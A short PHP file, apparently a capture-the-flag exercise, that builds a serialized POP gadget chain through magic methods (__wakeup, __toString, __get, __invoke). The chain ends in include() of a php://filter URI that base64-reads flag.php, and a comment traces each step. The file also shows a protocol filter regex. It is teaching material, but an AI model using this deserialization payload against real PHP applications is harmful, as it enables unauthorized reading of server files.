<?php
//question:pop链具体利用过程描述
class Modifier {
    protected  $var='php://filter//read=convert.base64-encode/resource=flag.php';
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}
class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        $this->str = new Test();
        $this->str->p = new Modifier();
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}
class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}
$a=new Show();
$a->source=new Show();
echo serialize($a);
//pop chain:_wakeup->new Show()->_construct:source=index.php->source=new Show()->preg_match()->_toString:str=new Test()->
//->_get->_construct->p=new Modifier()->protected $var->_invoke:append()
